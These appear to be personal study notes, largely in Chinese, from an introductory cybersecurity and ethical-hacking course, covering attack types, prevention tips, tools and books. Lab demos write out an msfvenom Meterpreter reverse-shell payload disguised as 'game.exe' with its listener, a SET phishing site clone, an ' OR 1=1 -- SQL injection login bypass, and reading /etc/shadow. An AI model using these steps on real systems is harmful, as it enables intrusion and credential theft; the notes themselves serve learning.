# Cyber Security

## Cyber Attack

### 1. Malware Attack（木马）

### 2. Phishing Attack（钓鱼）

### 3. Man-in-the-middle Attack：

通过不安全的网络、WiFi，或者木马，黑客知道了你的 IP 地址，就能在你和服务器通信之间攻击你。

### 4. Password Attack

黑客系统中最简单的攻击方法之一。使用简单的密码容易出问题。

## 防止被攻击的方法：

### 1. 防火墙

### 2. 蜜罐

### 3. 使用较复杂的密码，不点陌生人发送的邮件

## Malware Attack

木马，下载的破解软件中可能会藏有。★

点开不明链接，可能会自动下载木马。

U 盘中可能会藏有木马。

### Famous types of malware

1. Keylogger：运行在后台时，可以监控键盘上输入的任何东西，并能看见使用了什么软件、访问了哪些网页。甚至还能将它们发送到自己的邮箱。★

    虚拟机中进入网址：https://free-keylogger.en.softonic.com ，可以下载 Keylogger。

2. Virus

3. Worms

4. Trojan horse

## Social Engineering Attack

1. Phishing Attack：通过伪造邮件，或者伪造网站来诱导目标输入自己的个人信息、银行卡信息；或者点开链接自动下载木马、病毒。
2. Spear Phishing Attack：钓鱼的一种，针对特定的人群。
3. Whaling Phishing Attack：钓鱼的一种，针对的是有钱人、有声有势的人。

银行不可能发送邮件来套取银行卡和个人信息。★

还有一种钓鱼方式，其他人伪造成一个国家有名的企业的员工，说你电脑不安全，让你与他分享密码，他会帮助你。

## Man in the Middle Attack

黑客在客户端和服务器之间窃听，偷取信息。

当黑客窃取到你的 IP 地址时，服务器会继续和黑客通讯。这一般发生在不安全的 Wi-Fi 网络和 Malware（恶意软件）上。

所以不要去随便连接外面的 Wi-Fi，比如咖啡厅的 Wi-Fi，当你连上后上网，上谷歌，上 Facebook ，输入银行卡密码，都会被窃取。这样攻击虽然不简单，但还是能够做到的。★

例子：

当你缺钱时打电话给朋友找他给信用卡信息时，可能中间就有黑客窃听，然后他的信用卡就被盗刷了。

## Denial of Service Attack

造成服务器拥塞，耗尽它的资源和带宽，使其瘫痪。

### Distributed Denial of Service (DDOS)

在多个系统上对一个服务器进行攻击。

## SQL Injection Attack

在数据库服务器 ( SQL server ) 中注入恶意 ( malicious ) 代码来获取信息。

这种攻击能使黑客自由增删改查数据库中的表 ( tables )，因此，也能获取管理员权限。

## Password attack

1. Dictionary attack：按照字典顺序对可能的密码挨个试一遍。

    ​		防止方法：不按字典顺序设密码。

2. Brute force：尝试解码密码或者数据。
3. Keylogger：前面那个软件。
4. Shoulder surfing：别人直接站在背后偷看你的密码。
5. Rainbow table：使用哈希表来找到用户的密码。

## Network Attacks

### Active Attack：

黑客使用 Man-in-Middle 攻击方式试图扰乱网络常态，从而修改数据和系统资源。

### Passive Attack：

入侵者截取网络传输中的数据，窃听但不修改。

## Motives behind Cybercrime

1. Disrupting business continuity
2. Information theft and manipunating data
3. Creating fear and chaos by disrupting critical infrastructure
4. Financial loss to the target
5. Achieving state's military objectives
6. Demand ransom
7. Damaging reputation of the target
8. Propagating religious or political beliefs

## What is Cyber Security? 

对网络、程序、操作系统和其他来自未授权的数字访问和攻击的保护。

### 网络安全与信息安全：

网络安全和信息安全是不同的：★

信息安全：部署程序和工具来保护敏感信息；

网络安全：用来保护网络的完整性的一系列技术。

## Network Security Control

### Firewall：

限制网络数据进出你的电脑，可以自己配置，定义一些规则，如：开一些 IP 和 端口。

### IDS (Intrusion Detection System) ：

侦测黑客的攻击等一些异常行为，与路由器和防火墙一起工作。

### Honeypots (蜜罐)：

用来引诱黑客去攻击一个网络，然而自己在其他的安全的网络。

## Why Cyber Security?

CIA: 

Confidentiality (机密性) ：非授权者不可使用。如：军事机密。

Integrity (完整性) ：非授权者不能增删改查该网络的数据。

Availability (可用性) ：授权者可以使用该网站。如：你使用你的 Google 帐号登录 GMail ，它是可用的。

## Tackling Cybercrime

1. Use unique and strong passwords
2. Avoid public Wi-Fi
3. Ignore and delete mails from unknown senders （不要下载破解软件，世界上没有免费的午餐）
4. Make use of antivirus software （高级功能都是要钱的，不同的系统上不同的杀软性能表现不太一样，有些在 Win 7 上强，而另一些则在 Win 10 上强）。一个网址：virustotal.com （分析可疑文件及链接是否是病毒。）
5. Use two step verification process
6. Be careful while downloading apps （在手机上还可能有一些限制，但是在 Windows 上，你下载软件的地方是在开放的网络上，很有可能是 恶意软件。可以使用上述病毒扫描网站去扫描它们。）

## Demo - Metasploit Attack

需要 一台 Kali Linux 虚拟机，和一台 Win 7 虚拟机。

1. 打开 Kali Terminal ，输入命令：`msfvenom -p windows/meterpreter/reverse_tcp lhoset=192.168.71.133（此 Kali 的 IP 地址） lport=4444 -f exe -a x86 > /root/Desktop/game.exe`。该命令会在 Kali 桌面生成一个 game.exe 文件。
2. 在有 apache service 的目录下，将该 文件 拷入其中：`cd /var/www/html`, `mkdir shared`, `chmod -R 755 shared`, `chown -R www-data:www-data shared`, `cp /root/Desktop/game.exe var/www/html/shared`, `cd shared`, `service apache2 start`。然后在 Win7 中浏览器地址栏输入：`192.168.71.133 (Kali 的 IP) /shared`，然后下载 game.exe 文件。
3. Start the listener：在 Kali 终端继续输入命令：`msfconsole`,`use exploit/multi/handler`,`set payload windows/meterpreter/reverse_tcp`, `show options`, `set lhost 192.168.71.133 (Kali IP) `, `set lport 4444`, `show options`, `exploit`, 返回 Win 7 ，运行 game.exe ，就能看到 对方的 IP 以及何时与我们的 Kali 连接的。

## Malware Attack - Prevention

1. Use Antivirus Software
2. Use Firewalls
3. Avoid clicking suspicious links
4. Update the OS (操作系统)

## Phishing Attack - Prevention

1. Check for errors and think before clicking （因为这是人为的，可能有拼写错误）
2. Install an Anti-Phishing toolbar
3. Often change your passwords

## Password Attack - Prevention

1. Use strong alpha numeric passwords
2. Change your passwords regularly
3. Don't leave a password hint in the open

## Man-In-The-Middle Attack - Prevention

1. Be aware of the security of the website you are using
2. Avoid using unsecure public Wi-Fis

## SQL Injection - Prevention

1. Use an Intrusion Detection System to detect SQL  injection attacks
2. Carry out a validation of the user supplied data

## Denial-Of-Service Attack - Prevention

1. Run a traffic analysis and identify malicious traffic
2. Have a DDoS response plan ready before hand
3. Use Cloud

## Insider Threat - Prevention

1. Organizations should implement security awareness
2. Employees should be trained to spot insider threat activities

## Cryptojacking - Prevention

1. Employees should be able to detect cryptojacking threats and keep all the applications updated
2. Make use of anti-cryptomining browser extensions like minerBlock

## Zero-Day Exploit - Prevention

1. Implement a patch management policy
2. Have an incident response plan

## Watering Hole Attack - Prevention

1. Regularly update your software
2. Use network security tools
3. Use VPN for example Nord VPN

## Ways to Prevent Cyberattacks

1. Update and use strong passwods
2. Update your software and use anti-virus protection software
3. Use firewalls and other network security tools
4. Be aware about Phishing scams
5. Use a VPN
6. Backup and encrypt your data
7. Educate and train your employees
8. Use two-factor authentication
9. Avoid using public Wi-Fis
10. Be aware of mobile threats

## More about DDoS Attack

### Motives Behind a DDoS Attack

1. Ransom (被攻击者 用钱 使攻击者停止攻击)
2. Hacktivism or Protest
3. Targeted Attacks

### How Does a DDoS Attack Work

1. Attackers infect IoT devices with malware in order to turn each of them into bot.
2. The botnet then starts sending service requests to the victim. By doing so, the target's resources are depleted. 

### Types of DDoS Attacks

1. Volume Based Attacks : works on saturating the target network's bandwidth with heavy volumes of traffic. 
   e.g.: Ping (ICMP) Flood (用大量的 ICMP Echo Request 诈骗服务器，使其不断响应) and UDP Floods. 
2. Protocal Attacks : 攻击目标设备的 网络层 ，对其 防火墙 和 其他服务器资源 (server resources) 进行挖矿 (exploit) 。
      e.g.: Ping of Death, SYN floods and Smurf DDoS to name a few. (SYN Flood Attack 发送请求利用 TCP 握手，但一直发送建立连接请求，服务器返回的确认信息一直不理，使服务器一直响应，占用资源。)
2. Application Layer Attacks : crash the web servers ，这种方式相对老练。
   e.g.: HTTP Flood 许多正当的 HTTP GET or POST 请求来污染服务器。

### DDoS Attack Prevention

1. Acquire more Bandwidth
2. Have a Response plan ready
3. Configure Network Hardware against an attack
4. Make use of a Cloud
5. Monitor your website traffic
6. Be aware of the warning signs
7. Have everything up to date
8. Use DDoS prevention tools like Imperva, Cloudfare, F5 Networks, Arbor DDoS

## Who is a Cyber Security expert?

An individual employed by an orgnization to protect their data. 

### What are they doing?

Use techniques to 

1. Finding weakness
2. Monitor systems
3. Network breach

然后修复相对较弱的地方，增强容易被攻击的点。

### Domains in Cyber Security

1. Asset Security
2. Security achitecture and engineering
3. Communication and network Security
4. Identity and access mannagement
5. Security operations
6. Security assessment and Testing
7. Software development Security
8. Security and risk management

## Ethical hacking

防止本公司的服务器被其他黑客攻击。

### six different phases : 

1. Reconnaissance （工具：NMAP、hping）
2. Scanning phase ( NMAP、nexpose )
3. Gaining access (Metasploit)
4. Maintaining access （ metasploit ）
5. Clearing tracks ：保持连接，因为可能被改了密码等等，可以注入一个 Trojan 。
6. Reporting

### needed skills :

1. Operating environment: Windows, Linux, Unix, MacOS
2. Programming language: HTML, PHP, Python, SQL, JS
3. Networking: 是基础。
4. 证书

### Types of Hackers

1. Black Hat Hacker ：黑客。
2. White Hat Hacker ：Ethical Hacker
3. Gray Hat Hacker ：both
4. Script Kiddies ：业余爱好者，主要使用现成的工具和代码。目的是装逼，或者随便玩儿玩儿。
5. Nation Sponsored Hacker ：政府黑客。
6. Hacktivist ：主要是宣传政治。

### Skills of an Ethical Hacker

1. 知道这些操作系统的 desktop 和 server 版各如何工作
2. PHP, Python, Ruby, HTML
3. 深入理解计算机网络
4. 各种安全评估
5. 当地的安全法和标准
6. 全球性的与网络相关的证书

### Ethical Hacking Tools

1. Nessus ：检测漏洞
2. metasxploit ：检验漏洞是否真的存在
3. wireshark ：查看传输信息发送的数据包
4. NMAP ：查看使用的各种协议
5. sqlmap ：sql 注入

### How to Hack using Social Engineering

1. Familiarity Exploit
2. Phishing ：通过邮箱的形式伪造网站链接
3. Exploiting Human Curiosity ：可能有人将病毒 U 盘故意丢在车库，有人有好奇心捡到了，就拿到自己电脑上去看，就中招了。
4. Exploiting Human Greed

### Cryptography

#### 一些网站：

AES 加密算法是最强的。★

spammimic.com ：可以将输入的一句话编码成垃圾邮件；对方收到后知道这是个垃圾邮件，就可以进入该网站进行解码。★

aspencrypt.com：一个可以用于加密信息的网站。

## Kali Demos

### Phishing demo：

打开 Kali 中的 Social engineering toolkit -> 选择 Social-Engeneering Attacks -> Website Attack Vectors -> Credential Harvester Attack Method -> Site Cloner -> 输入一个网站，回车 -> 在浏览器中输入自己的 ip ，发现已经变成了访问输入的那个网站。

这样可以造一个假网站，给别人发送它的账户不安全，然后让他在假网站上输入帐号和密码。

### SQL Injection Attack Demo

VMware 打开 OWASP Broken Web Apps VM 1.2 -> 在浏览器中访问它提供的 IP 地址 -> 点击 OWASP Mutillidae Ⅱ -> OWASP 2013 -> Injection (SQL) -> Bypass Authentication -> Login

随便输入一个用户名和密码，登不上去。然后在用户名处输入一个 单引号 ，它会显示出错误信息。此时在用户名处输入：一个单引号，后接一个空格，`OR 1=1`，两个杠，一个空格（`' OR 1=1 -- `) 。然后输入回车，就能登录成功。

原理：使用两个杠后面加空格，可以使你提供一个条件，即：1=1，若此条件成立，则能登录成功。★

主要是要清楚 SQL 查询的工作原理，及 SQL 的结构。

---

另一个工具：

打开 Kali 终端，输入`sqlmap` -> `sqlmap -u https://urlhere`。

在此处输入一个域名。使用这个工具不需要知道 sql 的原理。这个 Demo 不能演示，因为是违法的。

### Virtual Private Network (VPS)

一些软件：

CyberGhost (cyberghost.com) ：我使用的它。具体谁好根据需求来。

expressvpn.com

nordvpn.com

HIDEMYASS!

SAFERVPN

### Virtual Private Server (VPS)

Example of VPS ：

GoDaddy

networksolutions

register.com

### Cloud:

rackspace.com

amazon

### Other keywords

Tor 浏览器 (cmyip.com 可以查看自己的 IP)

Keylogger

Firewall (GlassWire 是一个网络流量监控工具，也可以配置防火墙；Sophos 是一个杀毒软件)

Rootkit (非法登录计算机，可以隐藏其他软件)

### Ethical Hacking Techniques

Black box

White box

Gray box

### Ethical hacking tools

beef

metasploit

NMAP

Nessus : vulnerability scanner

Wireshark

sqlmap

John the ripper : password hacking tool

back track : network security suite

### Areas of ethical hacking

Network services : use GlassWire . (e.g. : Firewall testing)

Web application : (e.g. : Outlook)

Client side : (e.g. : Media player)

Wireless : (e.g : tablet or smartphones)

Social engineering

## Demo on Metasploit

### SQL Injection ：

进入上次 sql injection demo 的页面 -> OWASP 2013 -> A1 - Injection (SQL) -> Extract data 

输入`' OR 1=1 -- `，点击 view account details 。

### Password Attack：（破解使用同一台电脑的其他用户的密码）

登录 Win7 虚拟机，打开 Cain 软件 -> 点击 加号 ，创建，即可查看该电脑上的用户和密码的 hash 值 -> 右击 hash 值，可以进行攻击，但需要的时间很长，不现实，后面我们有更简单的方法（见下述 demo）。

### Metasploit Attack

有点难

先扫描端口，然后攻击它的端口，进入它的 LInux 目录，读取它的 /etc/passwd 、 /etc/shadow ，获取其 用户名 和 密码 的 hash 值。

## 参加工作？

网络安全，黑客 这些工作，需要考证。

## Best Books for Ethical Hacking

1. The Basics of Hacking and Penetration Testing —— Patrick Engebretson
2. Hacking: A Beginner's Guide to Computer Hacking, Basic Security and Penetration Testing —— John Slavio
3. Hacking: The Art of Exploitation —— John Erickson
4. Kali Linux - An Ethical Hacker's Cookbook —— Himanshu Sharma
5. Metasploit - The Penetration Tester's Guide —— David Kennedy, Jim O'Gorman, Devon Kearns, Mati Aharoni
6. Penetration Testing: A Hands-On Introduction to Hacking —— Georgia Weidman
7. The Hacker Playbook 3 —— Peter Kim
8. Black Hat Python: Python Programming for Hackers and Pentesters —— Justin Seitz
9. The Web Application Hacker's Handbook: Finding and Exploiting Security Flaw —— Dafydd Stuttard, Marcus Pinto
10. Web Security Testing Cookbook: Systematic Techniques to Find Problems Fast —— Paco Hope, Ben Walther

## SimplyLearn

有个 Ethical Hacking Course Overview ，这个课应该不错。太贵了。